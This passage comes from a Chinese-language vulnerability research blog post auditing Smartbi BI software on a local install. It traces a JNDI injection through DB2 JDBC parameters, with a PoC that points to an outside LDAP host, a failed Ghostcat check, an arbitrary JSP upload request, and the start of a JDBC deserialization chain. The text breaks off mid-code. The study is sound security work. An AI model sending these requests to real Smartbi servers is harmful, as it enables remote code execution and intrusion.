class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>    request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>    response.setBufferSize(<span class="hljs-number">4096</span>);<br>    <span class="hljs-comment">//type=sqldictsync 时执行</span><br>    <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>        <span class="hljs-comment">//记录时间</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-comment">//数据库连接参数</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//输出调试日志，记录数据库名、查询语句等</span><br>        log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-comment">//如果 dbNameOnly == true，数据库名和 SQL 进行同步，执行SyncResources</span><br>        <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//否则就完整使用所有连接信息进行数据库连接和 SQL 查询</span><br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>        &#125;<br></code></pre></td></tr></table></figure><p>此处的参数 dbType、dbServer、dbName等全部由用户输入，可控且无任何检验、过滤</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncResources.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//接收用户输入的数据库参数</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//使用 DbUtil.getConnection 创建数据库连接，继续跟进</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>        <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>        <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>E:\Smartbi\SmartbiUnionServer\plugin\SmartbiPrestoClickHouseJdbc\smartbiCommon.jar!\smartbi\util\DbUtil.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String driver, String url, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>    info.setId(UUIDGenerator.generate());<br>    info.setName(connName);<br>    <span class="hljs-comment">// driver 和 url 参数都是从 drvInfo取值</span><br>    info.setDriver(driver);<br>    info.setUrl(url);<br>    info.setUser(dbUser);<br>    info.setPassword(dbPass);<br>    <span class="hljs-comment">//调用 getConnection 方法。执行 jdbc </span><br>    <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">DBType</span> <span class="hljs-variable">driverType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        driverType = DBType.valueOf(dbType.toUpperCase());<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);<br>    <span class="hljs-keyword">if</span> (drvInfo == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DefaultConnectionInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConnectionInfo</span>();<br>        info.setId(UUIDGenerator.generate());<br>        info.setName(connName);<br>        info.setDriverType(driverType);<br>        info.setDriver(drvInfo[<span class="hljs-number">0</span>]);<br>        info.setUrl(drvInfo[<span class="hljs-number">1</span>]);<br>        info.setUser(dbUser);<br>        info.setPassword(dbPass);<br>        <span class="hljs-keyword">return</span> ConnectionPool.getInstance().getConnection(info);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 translateDriverInfo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName) &#123;<br>    <span class="hljs-keyword">return</span> translateDriverInfo(dbType, serverName, dbName, (String)<span class="hljs-literal">null</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) &#123;<br>    String[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-comment">//以 dbType 确定数据库类型</span><br>    <span class="hljs-keyword">switch</span> (dbType) &#123;<br>        <span class="hljs-keyword">case</span> DB2:<br>        <span class="hljs-keyword">case</span> DB2_400:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;COM.ibm.db2.jdbc.net.DB2Driver&quot;</span>;<br>            result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> DB2_V9:<br>            result[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;com.ibm.db2.jcc.DB2Driver&quot;</span>;<br>            <span class="hljs-keyword">if</span> (serverName.indexOf(<span class="hljs-string">&quot;:&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;:50000/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                result[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;jdbc:db2://&quot;</span> + serverName + <span class="hljs-string">&quot;/&quot;</span> + dbName + <span class="hljs-string">&quot;:deferPrepares=false;&quot;</span>;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure><p>构造poc:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span>localhost:<span class="hljs-number">6688</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br><br><span class="hljs-attr">type</span><span class="hljs-operator">=</span>sqldictsync<span class="hljs-variable">&amp;</span>dbT<span class="hljs-attr">ype</span><span class="hljs-operator">=</span>DB2_V9<span class="hljs-variable">&amp;</span>dbS<span class="hljs-attr">erver</span><span class="hljs-operator">=</span><span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>:<span class="hljs-number">18080</span><span class="hljs-variable">&amp;</span>dbN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>a:a=a<span class="hljs-punctuation">;</span>clientRerouteServerListJNDIN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>ldap:<span class="hljs-comment">//169.254.39.1:1389/6bqlht;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png" alt="20250802165747255"></p><h2 id="tomcat-历史漏洞（实则没有）"><a href="#tomcat-历史漏洞（实则没有）" class="headerlink" title="tomcat 历史漏洞（实则没有）"></a>tomcat 历史漏洞（实则没有）</h2><p>确定 tomcat 版本为 <code>Apache Tomcat Version 7.0.34</code></p><p>E:\Smartbi\Tomcat\RELEASE-NOTES</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png" alt="20250731181914395"></p><h2 id="1、AJP-导致的-RCE"><a href="#1、AJP-导致的-RCE" class="headerlink" title="1、AJP 导致的 RCE"></a>1、AJP 导致的 RCE</h2><blockquote><p>CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析</p><p><a href="https://www.cnblogs.com/backlion/p/12870365.html">https://www.cnblogs.com/backlion/p/12870365.html</a></p><p>默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0&#x2F;0）.</p></blockquote><p>确认 18009 端口开放，且能够建立 TCP 连接：</p><p><code>Test-NetConnection -ComputerName 127.0.0.1 -Port 18009</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png" alt="20250731185501657"></p><p>使用 Ghostcat 漏洞检测工具：</p><p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><p>脚本成功建立了AJP协议连接返回了Tomcat 7.0.34的错误页面</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png" alt="20250731191051181"></p><p>可能由于Smartbi对WEB-INF目录做了额外保护或者Tomcat配置了限制访问，并不能读取到文件</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>文件位置：Tomcat&#x2F;webapps&#x2F;smartbi&#x2F;vision&#x2F;designer&#x2F;imageimport.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span>%&gt;<br>&lt;%<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> request.getSession().getServletContext().getRealPath(<span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;/vision/designer/images/&quot;</span>;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">dir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path);<br>    <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>       dir.mkdirs();<br>    &#125;<br>    <span class="hljs-comment">//从请求头 X-File-Name 获取上传文件名</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(request.getHeader(<span class="hljs-string">&quot;X-File-Name&quot;</span>).getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>), <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-comment">//获取文件类型</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">fileType</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;X-File-Type&quot;</span>);<br>    <span class="hljs-comment">//判断是否包含 image 字符串 </span><br>    <span class="hljs-keyword">if</span>(fileType.indexOf(<span class="hljs-string">&quot;image&quot;</span>) == -<span class="hljs-number">1</span>) &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>       response.resetBuffer();<br>       response.getOutputStream().write(<span class="hljs-string">&quot;error file type!&quot;</span>.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>       <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(path + fileName);<br>    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);<br>    <span class="hljs-type">int</span> bytesRead;<br>    <span class="hljs-type">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]; <span class="hljs-comment">// 4K buffer</span><br>    <span class="hljs-keyword">while</span> ((bytesRead = request.getInputStream().read(buf)) != -<span class="hljs-number">1</span>) &#123;<br>       fos.write(buf, <span class="hljs-number">0</span>, bytesRead);<br>    &#125;<br>    fos.flush();<br>    fos.close();<br>    smartbi.net.sf.json.<span class="hljs-type">JSONObject</span> <span class="hljs-variable">jobj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">smartbi</span>.net.sf.json.JSONObject();<br>    jobj.put(<span class="hljs-string">&quot;url&quot;</span>, path.substring(path.lastIndexOf(<span class="hljs-string">&quot;images/&quot;</span>)) + <span class="hljs-string">&quot;/&quot;</span> + fileName);<br>    <span class="hljs-comment">//jobj.put(&quot;dir&quot;, dir.getCanonicalPath());</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> jobj.toString();<br>    response.setContentType(<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>);<br>    response.resetBuffer();<br>    response.getOutputStream().write(resultStr.getBytes(<span class="hljs-string">&quot;UTF-8&quot;</span>));<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    e.printStackTrace();<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>对上传的文件名、MIME类型无判断、不严谨，可伪造伪造文件类型上传成功，造成漏洞</p><p><strong>漏洞复现：</strong></p><p>路由：<a href="http://localhost:18080/smartbi/vision/designer/imageimport.jsp">http://localhost:18080/smartbi/vision/designer/imageimport.jsp</a></p><p>需要配置页（<a href="http://localhost:18080/smartbi/vision/config.jsp%EF%BC%89%E7%9A%84%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E8%83%BD%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%BB%93%E5%90%88%EF%BC%8C%E5%B1%9E%E4%BA%8E%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E">http://localhost:18080/smartbi/vision/config.jsp）的登录密码，所以不能和未授权访问结合，属于后台漏洞</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png" alt="20250805160347015"></p><p>poc:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-comment">//GET 和 POST 都可以</span><br>GET <span class="hljs-regexp">/smartbi/</span>vision<span class="hljs-regexp">/designer/im</span>ageimport.jsp HTTP/<span class="hljs-number">1.1</span><br><br>X-<span class="hljs-keyword">File</span>-Type: image<br>X-<span class="hljs-keyword">File</span>-Name: <span class="hljs-number">1</span>.jsp<br><br>&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/smartbi/vision/designer/imageimport.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic YWRtaW46YWRtaW4=<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF<br><span class="hljs-attribute">X-File-Type</span><span class="hljs-punctuation">: </span>image<br><span class="hljs-attribute">X-File-Name</span><span class="hljs-punctuation">: </span>1.jsp<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-mel">&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png" alt="20250805161922205"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png" alt="20250805162159129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png" alt="20250805162430488"></p><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><blockquote><p>JDBC反序列化学习</p><p><a href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p><p><a href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p><p><a href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p></blockquote><h3 id="关键条件："><a href="#关键条件：" class="headerlink" title="关键条件："></a>关键条件：</h3><ol><li><p>mysql-connector-java 的依赖版本为5.1.44，支持 <code>autoDeserialize=true</code> 参数，具备反序列化触发点</p></li><li><p>在 pom.xml 中 common-collections 版本为 3.2.1，存在cc反序列化利用链</p></li><li><p>存在方法调用反射机制 RMIServlet ，可远程调用任意类方法</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png" alt="20250806085001007"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png" alt="20250806125442264"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png" alt="20250806125519870"></p><h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>触发点：DataSourceService -&gt; testConnection</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\datasource\DataSourceService.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure><p>攻击者向<code>/vision/RMIServlet</code> 发送如下 POST 请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:18080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-nim">className=<span class="hljs-type">DataSourceService</span>&amp;methodName=testConnection&amp;params=[<span class="hljs-meta">&#123;...&#125;</span>]</span><br></code></pre></td></tr></table></figure><p>通过类名和方法名反射调用，即：</p><p><code>className = DataSourceService</code> </p><p><code>methodName = testConnection</code> </p><p><code>params = [...]</code> 是 JSON 数组字符串，传进去后被包装成 <code>JSONArray</code> 类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processExecute</span><span class="hljs-params">(HttpServletRequest request, String className, String methodName, String params)</span> &#123;<br>        <span class="hljs-comment">//RMIModule.getInstance() 返回一个远程服务模块（单例），它负责管理所有可远程调用的服务，getService(className) 